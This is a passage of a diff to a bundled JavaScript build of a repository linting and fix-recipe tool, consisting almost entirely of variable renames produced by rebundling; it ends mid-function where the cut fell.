   const entries2 = await readdir(directory, { withFileTypes: true });
   const files = await Promise.all(
-    entries2.map(async (entry) => {
-      const path = join2(directory, entry.name);
-      return entry.isDirectory() ? walk(root, path) : [toPosix(relative2(root, path))];
+    entries2.map(async (entry2) => {
+      const path = join2(directory, entry2.name);
+      return entry2.isDirectory() ? walk(root, path) : [toPosix(relative2(root, path))];
     })
   );
   return files.flat().sort();
 }
 function parseCase(id, text4, files) {
-  const raw = (0, import_yaml18.parse)(text4) ?? {};
-  const expected = Array.isArray(raw.expected) ? raw.expected.map((entry) => {
-    const item = entry;
+  const raw = (0, import_yaml33.parse)(text4) ?? {};
+  const expected = Array.isArray(raw.expected) ? raw.expected.map((entry2) => {
+    const item = entry2;
     if (typeof item.rule !== "string" || typeof item.path !== "string") throw new Error(`${id}: expected entries need rule and path`);
     return { rule: item.rule, path: item.path, ...typeof item.line === "number" ? { line: item.line } : {} };
   }) : [];
   const declared = Array.isArray(raw.rules) ? raw.rules.filter((rule) => typeof rule === "string") : [];
-  const rules9 = [.../* @__PURE__ */ new Set([...declared, ...expected.map((finding2) => finding2.rule)])];
+  const rules13 = [.../* @__PURE__ */ new Set([...declared, ...expected.map((finding3) => finding3.rule)])];
   const change = raw.change;
   return {
     id,
     description: typeof raw.description === "string" ? raw.description : id,
-    rules: rules9.length > 0 ? rules9 : ["*"],
+    rules: rules13.length > 0 ? rules13 : ["*"],
     expected,
     files,
     inventoryComplete: raw.inventoryComplete !== false,
@@ -20046,7 +22674,7 @@ function parseCase(id, text4, files) {
   };
 }
 async function loadCorpus(directory) {
-  const ids2 = (await readdir(directory, { withFileTypes: true })).filter((entry) => entry.isDirectory()).map((entry) => entry.name).sort();
+  const ids2 = (await readdir(directory, { withFileTypes: true })).filter((entry2) => entry2.isDirectory()).map((entry2) => entry2.name).sort();
   return Promise.all(
     ids2.map(async (id) => {
       const caseDir = join2(directory, id);
@@ -20585,7 +23213,7 @@ ${report}`, result.notes);
 }
 
 // src/experiments/propose.ts
-var import_yaml19 = __toESM(require_dist(), 1);
+var import_yaml34 = __toESM(require_dist(), 1);
 var DAY2 = 864e5;
 function validateProposal(text4, options) {
   const now2 = options.now ?? /* @__PURE__ */ new Date();
@@ -20593,7 +23221,7 @@ function validateProposal(text4, options) {
   const expiresAt = new Date(now2.getTime() + options.config.selection.maxAgeDays * DAY2).toISOString();
   let raw;
   try {
-    raw = (0, import_yaml19.parse)(text4);
+    raw = (0, import_yaml34.parse)(text4);
   } catch (error2) {
     return { errors: [`manifest: ${error2.message}`] };
   }
@@ -20757,20 +23385,20 @@ function selectInventory(entries2, config) {
   const truncated = [];
   let complete = true;
   const ignored = (path) => config.ignorePaths.some((glob) => matchesGlob(path, glob) || matchesGlob(path, `${glob}/**`));
-  for (const entry of [...entries2].sort((a, b) => a.path.localeCompare(b.path))) {
-    if (!isInventoryPath(entry.path) || ignored(entry.path)) continue;
+  for (const entry2 of [...entries2].sort((a, b) => a.path.localeCompare(b.path))) {
+    if (!isInventoryPath(entry2.path) || ignored(entry2.path)) continue;
     if (paths.length >= config.limits.maxFiles) {
       complete = false;
       break;
     }
-    if ((entry.size ?? 0) > config.limits.maxFileBytes) {
-      if (!isLockfile(entry.path)) {
+    if ((entry2.size ?? 0) > config.limits.maxFileBytes) {
+      if (!isLockfile(entry2.path)) {
         complete = false;
         continue;
       }
-      truncated.push(entry.path);
+      truncated.push(entry2.path);
     }
-    paths.push(entry.path);
+    paths.push(entry2.path);
   }
   return { paths, truncated, complete };
 }
@@ -20778,11 +23406,11 @@ function truncateContent(content) {
   return content.length > LOCKFILE_HEAD_BYTES ? content.slice(0, LOCKFILE_HEAD_BYTES) : content;
 }
 async function walk2(root, dir, out) {
-  for (const entry of await readdir2(dir, { withFileTypes: true })) {
-    const full = join4(dir, entry.name);
-    if (entry.isDirectory()) {
-      if (!SKIP_DIRS.has(entry.name)) await walk2(root, full, out);
-    } else if (entry.isFile()) {
+  for (const entry2 of await readdir2(dir, { withFileTypes: true })) {
+    const full = join4(dir, entry2.name);
+    if (entry2.isDirectory()) {
+      if (!SKIP_DIRS.has(entry2.name)) await walk2(root, full, out);
+    } else if (entry2.isFile()) {
       const path = relative3(root, full).split(sep2).join("/");
       if (isInventoryPath(path)) out.push({ path, size: (await stat2(full)).size });
     }
@@ -20886,8 +23514,8 @@ function markdown(result, options = {}) {
   } else {
     lines.push("| Severity | Rule | Location | Finding |", "| --- | --- | --- | --- |");
     for (const d2 of result.diagnostics.slice(0, limit3)) {
-      const finding2 = `${d2.message}${d2.suggestion ? `<br>**Fix:** ${d2.suggestion}` : ""}`.replace(/\|/g, "\\|");
-      lines.push(`| ${d2.severity} | [\`${d2.ruleId}\`](${d2.docsUrl}) | \`${d2.path}:${d2.line}\` | ${finding2} |`);
+      const finding3 = `${d2.message}${d2.suggestion ? `<br>**Fix:** ${d2.suggestion}` : ""}`.replace(/\|/g, "\\|");
+      lines.push(`| ${d2.severity} | [\`${d2.ruleId}\`](${d2.docsUrl}) | \`${d2.path}:${d2.line}\` | ${finding3} |`);
     }
     if (result.diagnostics.length > limit3) lines.push("", `_${result.diagnostics.length - limit3} more finding(s) omitted._`);
   }
@@ -20898,8 +23526,8 @@ function markdown(result, options = {}) {
   }
   return lines.join("\n");
 }
-function sarif(result, rules9, version = "0.0.0") {
-  const used = rules9.filter((rule) => result.diagnostics.some((d2) => d2.ruleId === rule.meta.id));
+function sarif(result, rules13, version = "0.0.0") {
+  const used = rules13.filter((rule) => result.diagnostics.some((d2) => d2.ruleId === rule.meta.id));
   const index = new Map(used.map((rule, position) => [rule.meta.id, position]));
   const level = { error: "error", warn: "warning", info: "note" };
   const securitySeverity = { high: "7.0", medium: "4.0", low: "2.0" };
@@ -20957,12 +23585,12 @@ ${rule.meta.references.map((ref) => `- ${ref}`).join("\n")}` },
     2
   );
 }
-function format(name, result, rules9, version) {
+function format(name, result, rules13, version) {
   switch (name) {
     case "json":
       return json(result);
     case "sarif":
-      return sarif(result, rules9, version);
+      return sarif(result, rules13, version);
     case "markdown":
       return markdown(result);
     case "github":
@@ -20984,14 +23612,14 @@ var IMPACTS2 = ["high", "medium", "low"];
 var CAPABILITIES = ["repository", "complete-inventory", "change-set"];
 var isRecord2 = (value2) => typeof value2 === "object" && value2 !== null && !Array.isArray(value2);
 var escapes = (path) => path === ".." || path.startsWith("../") || path.startsWith("..\\") || isAbsolute3(path);
-async function resolveModule(root, entry) {
-  const fail = (reason) => new UsageError(`localRules: "${entry}" ${reason}`);
-  if (SCHEME.test(entry)) throw fail("must be a repository-relative path, not a URL.");
-  if (isAbsolute3(entry) || win32.isAbsolute(entry) || posix2.isAbsolute(entry) || /^[\\/]/.test(entry)) {
+async function resolveModule(root, entry2) {
+  const fail = (reason) => new UsageError(`localRules: "${entry2}" ${reason}`);
+  if (SCHEME.test(entry2)) throw fail("must be a repository-relative path, not a URL.");
+  if (isAbsolute3(entry2) || win32.isAbsolute(entry2) || posix2.isAbsolute(entry2) || /^[\\/]/.test(entry2)) {
     throw fail("must be a repository-relative path, not an absolute path.");
   }
-  if (entry.includes(":")) throw fail("must be a repository-relative path without drive letters or colons.");
-  const normalized = posix2.normalize(entry.replace(/\\/g, "/"));
+  if (entry2.includes(":")) throw fail("must be a repository-relative path without drive letters or colons.");
+  const normalized = posix2.normalize(entry2.replace(/\\/g, "/"));
   if (normalized === ".." || normalized.startsWith("../")) throw fail("must stay inside the repository.");
   if (!/\.(m?js)$/.test(normalized)) throw fail("must be a .js or .mjs file.");
   const file = join5(root, normalized);
@@ -21001,8 +23629,8 @@ async function resolveModule(root, entry) {
   if (escapes(relative4(realRoot, realFile))) throw fail("resolves outside the repository (symbolic link).");
   return realFile;
 }
-function validateRule(entry, value2) {
-  const fail = (reason) => new UsageError(`localRules: "${entry}" exports an invalid rule: ${reason}`);
+function validateRule(entry2, value2) {
+  const fail = (reason) => new UsageError(`localRules: "${entry2}" exports an invalid rule: ${reason}`);
   if (!isRecord2(value2) || !isRecord2(value2.meta)) throw fail("expected an object with `meta` and `check`.");
   const meta = value2.meta;
   const id = typeof meta.id === "string" ? meta.id : "";
@@ -21048,21 +23676,21 @@ function validateRule(entry, value2) {
 async function loadLocalRules(root, entries2, builtins) {
   const loaded = [];
   const builtinIds = new Set(builtins.map((rule) => rule.meta.id));
-  for (const entry of entries2) {
-    const real = await resolveModule(root, entry);
+  for (const entry2 of entries2) {
+    const real = await resolveModule(root, entry2);
     let module;
     try {
       module = await import(pathToFileURL(real).href);
     } catch (error2) {
-      throw new UsageError(`localRules: "${entry}" failed to load: ${error2 instanceof Error ? error2.message : String(error2)}`);
+      throw new UsageError(`localRules: "${entry2}" failed to load: ${error2 instanceof Error ? error2.message : String(error2)}`);
     }
     const exported = module.rules ?? module.default;
     const candidates = Array.isArray(exported) ? exported : exported === void 0 ? [] : [exported];
-    if (candidates.length === 0) throw new UsageError(`localRules: "${entry}" must export \`rules\` (an array) or a default rule or array of rules.`);
+    if (candidates.length === 0) throw new UsageError(`localRules: "${entry2}" must export \`rules\` (an array) or a default rule or array of rules.`);
     for (const candidate of candidates) {
-      const rule = validateRule(entry, candidate);
+      const rule = validateRule(entry2, candidate);
       if (builtinIds.has(rule.meta.id) || loaded.some((other) => other.meta.id === rule.meta.id)) {
-        throw new UsageError(`localRules: "${entry}" defines duplicate rule id "${rule.meta.id}".`);
+        throw new UsageError(`localRules: "${entry2}" defines duplicate rule id "${rule.meta.id}".`);
       }
       loaded.push(rule);
     }
@@ -21200,9 +23828,9 @@ function extractUnusedFlag(args) {
   }
   return { args: rest, severity: severity === "off" ? void 0 : severity };
 }
-function ruleListText(rules9) {
-  const width = Math.max(...rules9.map((rule) => rule.meta.id.length));
-  return rules9.map((rule) => `${rule.meta.id.padEnd(width)}  ${rule.meta.defaultSeverity.padEnd(5)}  ${rule.meta.fixable ? "fix" : "   "}  ${rule.meta.description}`).join("\n");
+function ruleListText(rules13) {
+  const width = Math.max(...rules13.map((rule) => rule.meta.id.length));
+  return rules13.map((rule) => `${rule.meta.id.padEnd(width)}  ${rule.meta.defaultSeverity.padEnd(5)}  ${rule.meta.fixable ? "fix" : "   "}  ${rule.meta.description}`).join("\n");
 }
 function invalidConfig(path, problems) {
   return new UsageError(`Invalid configuration ${path}:
@@ -21223,10 +23851,10 @@ async function loadLintConfig(io, root, explicit, options = {}) {
     if (!options.allowLocalRules) {
       throw new UsageError(`${path} lists localRules, which run JavaScript from the repository. Pass --allow-local-rules to load them (trusted repositories only).`);
     }
-    const rules9 = [...allRules, ...await loadLocalRules(root, parsed.config.localRules, allRules)];
-    const strict = parseConfigText(text4, rules9, path);
+    const rules13 = [...allRules, ...await loadLocalRules(root, parsed.config.localRules, allRules)];
+    const strict = parseConfigText(text4, rules13, path);
     if (strict.problems.length > 0) throw invalidConfig(path, strict.problems);
-    return { config: strict.config, path, rules: rules9 };
+    return { config: strict.config, path, rules: rules13 };
   }
   return { config: structuredClone(DEFAULT_CONFIG), rules: allRules };
 }
@@ -21278,14 +23906,14 @@ function withFile(input2, file, limits) {
   const truncated = input2.truncated.filter((path) => path !== file.path);
   return { ...input2, files, truncated: oversized ? [...truncated, file.path] : truncated };
 }
-function effectiveSeverities(config, rules9, presets) {
-  const severities = new Map(rules9.map((rule) => [rule.meta.id, "off"]));
-  for (const { rule, severity } of resolveRules(config, rules9, presets)) severities.set(rule.meta.id, severity);
+function effectiveSeverities(config, rules13, presets) {
+  const severities = new Map(rules13.map((rule) => [rule.meta.id, "off"]));
+  for (const { rule, severity } of resolveRules(config, rules13, presets)) severities.set(rule.meta.id, severity);
   return severities;
 }
-function explainRule(id, rules9, severities) {
-  const rule = rules9.find((candidate) => candidate.meta.id === id);
-  if (!rule) throw new UsageError(`--explain: unknown rule "${id}".${didYouMean(id, rules9.map((candidate) => candidate.meta.id))}`);
+function explainRule(id, rules13, severities) {
+  const rule = rules13.find((candidate) => candidate.meta.id === id);
+  if (!rule) throw new UsageError(`--explain: unknown rule "${id}".${didYouMean(id, rules13.map((candidate) => candidate.meta.id))}`);
   const { meta } = rule;
   const indent = (text4) => text4.replace(/\n$/, "").split("\n").map((line) => `    ${line}`).join("\n");
   const lines = [
@@ -21397,13 +24025,13 @@ async function lintCommand(rawArgs, io) {
   const { root, paths } = await resolveTarget(io, values2.root, positionals2);
   if (values2.init) return await initConfig(io, root, values2.config);
   const loaded = await loadLintConfig(io, root, values2.config, { localRules: true, allowLocalRules: values2["allow-local-rules"] });
-  const { config, rules: rules9 } = loaded;
+  const { config, rules: rules13 } = loaded;
   const presets = values2.preset?.map((preset) => {
     if (!PRESETS.includes(preset)) throw new UsageError(`--preset ${preset}: unknown preset.${didYouMean(preset, PRESETS)}`);
     return preset;
   });
-  const ruleIds = rules9.map((rule) => rule.meta.id);
-  const rulesets = [...new Set(rules9.map((rule) => rule.meta.ruleset))];
+  const ruleIds = rules13.map((rule) => rule.meta.id);
+  const rulesets = [...new Set(rules13.map((rule) => rule.meta.ruleset))];
   for (const value2 of values2.ruleset ?? []) {
     const [id, severity] = parseOverride("ruleset", value2, rulesets);
     config.rulesets = { ...config.rulesets, [id]: severity };
@@ -21417,13 +24045,13 @@ async function lintCommand(rawArgs, io) {
     config.failOn = values2["fail-on"];
   }
   if (values2["list-rules"]) {
-    await writeText(io, values2.output, ruleListText(rules9));
+    await writeText(io, values2.output, ruleListText(rules13));
     return 0;
   }
-  const severities = effectiveSeverities(config, rules9, presets);
+  const severities = effectiveSeverities(config, rules13, presets);
   if (values2.explain !== void 0) {
     const withMeta = new Map(severities).set(UNUSED_DIRECTIVE_RULE_ID, unusedSeverity ?? "off");
-    await writeText(io, values2.output, explainRule(values2.explain, [...rules9, UNUSED_DIRECTIVE_RULE], withMeta));
+    await writeText(io, values2.output, explainRule(values2.explain, [...rules13, UNUSED_DIRECTIVE_RULE], withMeta));
     return 0;
   }
   if (values2["print-config"]) {
@@ -21447,14 +24075,14 @@ async function lintCommand(rawArgs, io) {
     try {
       change = await changedSince(root, values2.base);
       const baseInput = await loadGitRevision(root, change.baseSha ?? values2.base, config);
-      baseFingerprints = new Set(lint(baseInput, { config, rules: rules9, ...presets ? { presets } : {} }).diagnostics.map((diagnostic) => diagnostic.fingerprint));
+      baseFingerprints = new Set(lint(baseInput, { config, rules: rules13, ...presets ? { presets } : {} }).diagnostics.map((diagnostic) => diagnostic.fingerprint));
     } catch (error2) {
       throw new UsageError(`--base ${values2.base}: ${error2.message.split("\n")[0]}`);
     }
   }
   const options = {
     config,
-    rules: rules9,
+    rules: rules13,
     ...presets ? { presets } : {},
     ...baseFingerprints ? { baseFingerprints } : {},
     reportUnusedDirectives: unusedSeverity !== void 0
@@ -21512,7 +24140,7 @@ async function lintCommand(rawArgs, io) {
     ...unusedDirectives2 ? { unusedDirectives: unusedDirectives2 } : {}
   };
   if (!input2.inventoryComplete) io.stderr("Inventory was truncated by limits; rules that check for missing files were skipped.");
-  const reportRules = [...rules9, UNUSED_DIRECTIVE_RULE];
+  const reportRules = [...rules13, UNUSED_DIRECTIVE_RULE];
   await writeText(io, values2.output, format(formatName, shown, reportRules, VERSION));
   if (values2.sarif) await writeText(io, values2.sarif, sarif(shown, reportRules, VERSION));
   const warnings = diagnostics.filter((diagnostic) => diagnostic.severity === "warn").length;
@@ -21606,7 +24234,7 @@ function structured(value2) {
   try {
     return JSON.parse(value2);
   } catch {
-    return (0, import_yaml20.parse)(value2);
+    return (0, import_yaml35.parse)(value2);
   }
 }
 async function measurementFiles(io, path) {
@@ -21627,8 +24255,8 @@ async function caseFiles(io, raw, config) {
   if (cases.length > MAX_CASES) throw new Error(`cases: at most ${MAX_CASES} new cases per experiment`);
   const files = [];
   let bytes = 0;
-  for (const [index, entry] of cases.entries()) {
-    const item = entry ?? {};
+  for (const [index, entry2] of cases.entries()) {
+    const item = entry2 ?? {};
     const id = String(item.id ?? "");
     if (!CASE_ID.test(id)) throw new Error(`cases[${index}].id must be lowercase kebab-case`);
     const exists = await stat5(resolvePath(io, join7(config.evaluation.corpus, id))).then(() => true, () => false);
@@ -21815,8 +24443,8 @@ function judgments(items2) {
   return items2.flatMap((item) => {
     const list3 = structured(item.judgments);
     if (!Array.isArray(list3)) return [];
-    return list3.flatMap((entry) => {
-      const judgment = entry ?? {};
+    return list3.flatMap((entry2) => {
+      const judgment = entry2 ?? {};
       const score = Number(judgment.score);
       if (typeof judgment.experiment !== "string" || typeof judgment.arm !== "string" || !Number.isFinite(score)) return [];
       return [{ experiment: judgment.experiment, arm: judgment.arm, score: Math.max(0, Math.min(1, score)), rationale: String(judgment.rationale ?? "").slice(0, 2e3) }];
@@ -21923,10 +24551,10 @@ async function loadRepositorySnapshot(client, repo, options) {
   const tree = await client.request("GET /repos/{owner}/{repo}/git/trees/{tree_sha}", { ...repo, tree_sha: commit.treeSha, recursive: "1" });
   const treeData = tree.data;
   const blobs = new Map(
-    treeData.tree.filter((entry) => entry.type === "blob" && entry.mode !== SYMLINK_MODE && (!options.pathFilter || options.pathFilter(entry.path))).map((entry) => [entry.path, entry])
+    treeData.tree.filter((entry2) => entry2.type === "blob" && entry2.mode !== SYMLINK_MODE && (!options.pathFilter || options.pathFilter(entry2.path))).map((entry2) => [entry2.path, entry2])
   );
   const selection = selectInventory(
-    [...blobs.values()].map((entry) => ({ path: entry.path, ...entry.size !== void 0 ? { size: entry.size } : {} })),
+    [...blobs.values()].map((entry2) => ({ path: entry2.path, ...entry2.size !== void 0 ? { size: entry2.size } : {} })),
     options.config
   );
   const truncated = new Set(selection.truncated);
@@ -21980,7 +24608,7 @@ function ruleMatches(pattern, ruleId) {
 function isIgnored(diagnostic, config, dismissed = NO_DISMISSALS) {
   if (dismissed.rules.has(diagnostic.ruleId)) return true;
   return config.ignore.some(
-    (entry) => ruleMatches(entry.rule, diagnostic.ruleId) && (!entry.paths || entry.paths.some((glob) => matchesGlob(diagnostic.path, glob)))
+    (entry2) => ruleMatches(entry2.rule, diagnostic.ruleId) && (!entry2.paths || entry2.paths.some((glob) => matchesGlob(diagnostic.path, glob)))
   );
 }
 function branchFor(group, config) {
@@ -22292,14 +24920,14 @@ async function listManagedPullRequests(client, repo, discovery) {
   return result;
 }
 function dismissalsFrom(prs) {
-  const rules9 = /* @__PURE__ */ new Set();
+  const rules13 = /* @__PURE__ */ new Set();
   const groups = /* @__PURE__ */ new Set();
   for (const pr of prs) {
     if (!pr.labels.includes(IGNORED_LABEL)) continue;
-    for (const rule of pr.ignoredRules) rules9.add(rule);
+    for (const rule of pr.ignoredRules) rules13.add(rule);
     if (pr.ignoredGroup) groups.add(pr.group);
   }
-  return { rules: rules9, groups };
+  return { rules: rules13, groups };
 }
 async function currentFix(client, repo, previous2) {
   const response = await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: previous2.number });
@@ -22773,7 +25401,7 @@ function classifyIssueOutcome(issue) {
 }
 
 // src/recipes/recipe.ts
-var import_yaml21 = __toESM(require_dist(), 1);
+var import_yaml36 = __toESM(require_dist(), 1);
 var RECIPES_DIR = "recipes";
 var RECIPE_ID = /^[a-z0-9][a-z0-9-]{0,62}$/;
 var MAX_PATCH_CHARS = 6e4;
@@ -22828,9 +25456,9 @@ function buildRecipe(options) {
   const excludes = options.excludes ?? DEFAULT_PATCH_EXCLUDES;
   const files = options.files.filter((file) => !excludes.some((glob) => matchesGlob(file.filename, glob)));
   const patchFiles = files.map((file) => file.filename).sort();
-  const rules9 = [...manifest.applicability?.rules ?? []].sort();
+  const rules13 = [...manifest.applicability?.rules ?? []].sort();
   const globs = manifest.applicability?.files ?? [];
-  if (rules9.length === 0 && globs.length === 0 && patchFiles.length === 0) {
+  if (rules13.length === 0 && globs.length === 0 && patchFiles.length === 0) {
     return { error: `Experiment "${manifest.name}" declares no applicability (rules or files) and its winning arm changed no files.` };
   }
   const patch = files.length > 0 ? renderPatch(files) : void 0;
@@ -22841,9 +25469,9 @@ function buildRecipe(options) {
     title: manifest.title,
     summary: manifest.hypothesis,
     risk: classifyRisk(patchFiles),
-    rules: rules9,
+    rules: rules13,
     // Without explicit globs, the files the winner touched decide applicability.
-    files: globs.length > 0 ? [...globs] : rules9.length === 0 ? patchFiles : [],
+    files: globs.length > 0 ? [...globs] : rules13.length === 0 ? patchFiles : [],
     ...manifest.applicability?.description ? { description: manifest.applicability.description } : {},
     instructions: `${arm.title}: ${arm.approach}`,
     evidence: { improvement: manifest.evidence?.improvement ?? 0, metrics: manifest.evidence?.metrics.map((metric) => ({ ...metric })) ?? [] },
@@ -22865,7 +25493,7 @@ function buildRecipe(options) {
   return { recipe, changed: serializeRecipe(recipe) !== serializeRecipe(previous2) };
 }
 function serializeRecipe(recipe) {
-  return (0, import_yaml21.stringify)(recipe, { lineWidth: 0 });
+  return (0, import_yaml36.stringify)(recipe, { lineWidth: 0 });
 }
 var isRecord3 = (value2) => typeof value2 === "object" && value2 !== null && !Array.isArray(value2);
 var strings = (value2) => Array.isArray(value2) ? value2.filter((item) => typeof item === "string") : [];
@@ -22873,7 +25501,7 @@ var num = (value2) => typeof value2 === "number" && Number.isFinite(value2) ? va
 function parseRecipe(text4) {
   let raw;
   try {
-    raw = (0, import_yaml21.parse)(text4, { maxAliasCount: 100 });
+    raw = (0, import_yaml36.parse)(text4, { maxAliasCount: 100 });
   } catch (error2) {
     return { problems: [`Invalid YAML: ${error2.message}`] };
   }
@@ -22888,9 +25516,9 @@ function parseRecipe(text4) {
   if (typeof source.repository !== "string" || typeof source.experiment !== "string" || typeof source.arm !== "string") {
     problems.push("source.repository, source.experiment and source.arm are required.");
   }
-  const rules9 = strings(raw.rules);
+  const rules13 = strings(raw.rules);
   const files = strings(raw.files);
-  if (rules9.length === 0 && files.length === 0) problems.push("A recipe needs rules or files to decide where it applies.");
+  if (rules13.length === 0 && files.length === 0) problems.push("A recipe needs rules or files to decide where it applies.");
   if (problems.length > 0) return { problems };
   const evidence2 = isRecord3(raw.evidence) ? raw.evidence : {};
   const compatibility2 = isRecord3(raw.compatibility) ? raw.compatibility : {};
@@ -22904,7 +25532,7 @@ function parseRecipe(text4) {
       title: raw.title,
       summary: raw.summary,
       risk: raw.risk,
-      rules: rules9,
+      rules: rules13,
       files,
       ...typeof raw.description === "string" ? { description: raw.description } : {},
       instructions: raw.instructions,
@@ -22948,9 +25576,9 @@ function activeRecipeRules(recipe, config) {
     return !(ruleset !== void 0 && config.rulesets[ruleset] === "off" && config.rules[id] === void 0);
   });
 }
-function recipeLintConfig(rules9, config) {
+function recipeLintConfig(rules13, config) {
   const settings = {};
-  for (const id of rules9) {
+  for (const id of rules13) {
     const current = config.rules[id];
     settings[id] = Array.isArray(current) ? ["warn", current[1]] : "warn";
   }
@@ -22968,24 +25596,24 @@ function planRecipe(options) {
   if (recipe.rules.length === 0) {
     return matchedFiles.length > 0 ? { rules: [], remaining: [], matchedFiles, status: "adapt", reason: `${matchedFiles.length} file(s) match the recipe; the change must be adapted.` } : { ...empty2, status: "not-applicable", reason: "No files match the recipe." };
   }
-  const rules9 = activeRecipeRules(recipe, config);
-  if (rules9.length === 0) return { ...empty2, status: "ignored", reason: "All of the recipe's rules are turned off in this repository." };
-  const lintConfig = recipeLintConfig(rules9, config);
+  const rules13 = activeRecipeRules(recipe, config);
+  if (rules13.length === 0) return { ...empty2, status: "ignored", reason: "All of the recipe's rules are turned off in this repository." };
+  const lintConfig = recipeLintConfig(rules13, config);
   const run4 = options.lint ?? ((target, effective) => lint2({ input: target, config: effective }));
   const relevant = (result) => ({
     ...result,
-    diagnostics: result.diagnostics.filter((d2) => rules9.includes(d2.ruleId) && !isIgnored(d2, config.fixes))
+    diagnostics: result.diagnostics.filter((d2) => rules13.includes(d2.ruleId) && !isIgnored(d2, config.fixes))
   });
   const lint3 = (target) => relevant(run4(target, lintConfig));
   const findings = lint3(input2).diagnostics;
-  if (findings.length === 0) return { rules: rules9, remaining: [], matchedFiles, status: "not-applicable", reason: "No findings for the recipe's rules." };
+  if (findings.length === 0) return { rules: rules13, remaining: [], matchedFiles, status: "not-applicable", reason: "No findings for the recipe's rules." };
   const group = recipeGroup(recipe);
-  const fixes = { ...config.fixes, groups: { [group]: { rules: rules9 } } };
+  const fixes = { ...config.fixes, groups: { [group]: { rules: rules13 } } };
   const change = computeFixChanges({ input: input2, lint: lint3, config: fixes }).find((candidate) => candidate.group === group);
-  if (!change) return { rules: rules9, remaining: findings, matchedFiles, status: "adapt", reason: `${findings.length} finding(s) need an adapted change (no autofix applies).` };
+  if (!change) return { rules: rules13, remaining: findings, matchedFiles, status: "adapt", reason: `${findings.length} finding(s) need an adapted change (no autofix applies).` };
   const updated = new Map(change.files.map((file) => [file.path, file.content]));
   const remaining = lint3({ ...input2, files: input2.files.map((file) => ({ path: file.path, content: updated.get(file.path) ?? file.content })) }).diagnostics;
-  return remaining.length === 0 ? { rules: rules9, change, remaining, matchedFiles, status: "autofix", reason: `Autofixes resolve all ${findings.length} finding(s).` } : { rules: rules9, change, remaining, matchedFiles, status: "partial", reason: `Autofixes resolve ${findings.length - remaining.length} of ${findings.length} finding(s).` };
+  return remaining.length === 0 ? { rules: rules13, change, remaining, matchedFiles, status: "autofix", reason: `Autofixes resolve all ${findings.length} finding(s).` } : { rules: rules13, change, remaining, matchedFiles, status: "partial", reason: `Autofixes resolve ${findings.length - remaining.length} of ${findings.length} finding(s).` };
 }
 var pct2 = (value2) => `${value2 >= 0 ? "" : "\u2212"}${Math.abs(Math.round(value2 * 1e3) / 10)}%`;
 function evidenceLines(recipe, context3) {
@@ -23106,7 +25734,7 @@ function recipeIssue(recipe, plan, options) {
 
 // src/knowledge/extract.ts
 init_identity();
-var import_yaml22 = __toESM(require_dist(), 1);
+var import_yaml37 = __toESM(require_dist(), 1);
 var packageName2 = /^(?:@[a-z0-9._-]+\/)?[a-z0-9._-]+$/;
 var managers = /* @__PURE__ */ new Set(["npm", "pnpm", "yarn", "bun"]);
 var toolFiles = {
@@ -23131,11 +25759,11 @@ function isKnowledgePath(path) {
 }
 function spec(value2) {
   const simple = /^(?:[~^]?\d+(?:\.(?:\d+|x|\*)){0,2}(?:-[0-9A-Za-z.-]+)?(?:\+[0-9A-Za-z.-]+)?|[x*])$/;
-  if (value2.length <= 256 && simple.test(value2)) return { kind: "version-expression", value: value2, digest: hash2(value2) };
+  if (value2.length <= 256 && simple.test(value2)) return { kind: "version-expression", value: value2, digest: hash3(value2) };
   if (value2.length <= 256 && value2.startsWith("workspace:") && (["*", "^", "~"].includes(value2.slice(10)) || simple.test(value2.slice(10)))) {
-    return { kind: "workspace-expression", value: value2, digest: hash2(value2) };
+    return { kind: "workspace-expression", value: value2, digest: hash3(value2) };
   }
-  return { kind: "opaque", digest: hash2(value2) };
+  return { kind: "opaque", digest: hash3(value2) };
 }
 function technology(name) {
   if (name === "turbo") return "turborepo";
@@ -23171,7 +25799,7 @@ function extractKnowledge(repository, revision, input2, options = {}) {
   const manifests = /* @__PURE__ */ new Map();
   const digests2 = /* @__PURE__ */ new Map();
   const source = (file, location = "") => {
-    if (!digests2.has(file.path)) digests2.set(file.path, hash2(file.content));
+    if (!digests2.has(file.path)) digests2.set(file.path, hash3(file.content));
     return { path: file.path, pointer: location, digest: digests2.get(file.path) };
   };
   let limited = false;
@@ -23237,7 +25865,7 @@ function extractKnowledge(repository, revision, input2, options = {}) {
   if (pnpm && truncated.has(pnpm.path)) problem(pnpm.path, "truncated-workspace-config");
   else if (pnpm) {
     try {
-      const parsed = (0, import_yaml22.parseDocument)(pnpm.content, { uniqueKeys: true });
+      const parsed = (0, import_yaml37.parseDocument)(pnpm.content, { uniqueKeys: true });
       if (parsed.errors.length) throw new Error("Invalid workspace YAML");
       const value2 = parsed.toJS();
       addWorkspace(record2(value2) ? value2.packages : void 0, pnpm, "/packages");
@@ -23246,9 +25874,9 @@ function extractKnowledge(repository, revision, input2, options = {}) {
     }
   }
   const workspace = workspaceSets[0];
-  const conflicting = workspaceSets.some((set) => JSON.stringify([...set].sort()) !== JSON.stringify([...workspace ?? []].sort()));
-  if (conflicting) problem("", "conflicting-workspaces");
-  const canResolveWorkspace = input2.mode === "repository" && input2.inventoryComplete && truncated.size === 0 && !options.ignorePaths?.length && !conflicting && problems.length === 0;
+  const conflicting2 = workspaceSets.some((set) => JSON.stringify([...set].sort()) !== JSON.stringify([...workspace ?? []].sort()));
+  if (conflicting2) problem("", "conflicting-workspaces");
+  const canResolveWorkspace = input2.mode === "repository" && input2.inventoryComplete && truncated.size === 0 && !options.ignorePaths?.length && !conflicting2 && problems.length === 0;
   const workspaceNames = /* @__PURE__ */ new Map();
   for (const project of projects) {
     if (project.name && workspace?.has(project.id)) {
@@ -23632,14 +26260,14 @@ async function recipeStatus(client, target, recipe, server = "https://github.com
 }
 
 // src/recipes/rollout.ts
-var import_yaml23 = __toESM(require_dist(), 1);
+var import_yaml38 = __toESM(require_dist(), 1);
 var DEFAULT_ROLLOUT = { waves: [1, 3, "25%", "100%"], minSamples: 5, minCompatibility: 0.7 };
 var REPO_NAME = /^[\w.-]+\/[\w.-]+$/;
 function parseRolloutTargets(text4) {
   const problems = [];
   let raw;
   try {
-    raw = (0, import_yaml23.parse)(text4);
+    raw = (0, import_yaml38.parse)(text4);
   } catch (error2) {
     return { repositories: [], canaries: [], config: DEFAULT_ROLLOUT, problems: [`Invalid YAML: ${error2.message}`] };
   }
@@ -23677,12 +26305,12 @@ function parseRolloutTargets(text4) {
   return { repositories, canaries, config, problems };
 }
 function fnv1a(text4) {
-  let hash3 = 2166136261;
+  let hash4 = 2166136261;
   for (let index = 0; index < text4.length; index += 1) {
-    hash3 ^= text4.charCodeAt(index);
-    hash3 = Math.imul(hash3, 16777619) >>> 0;
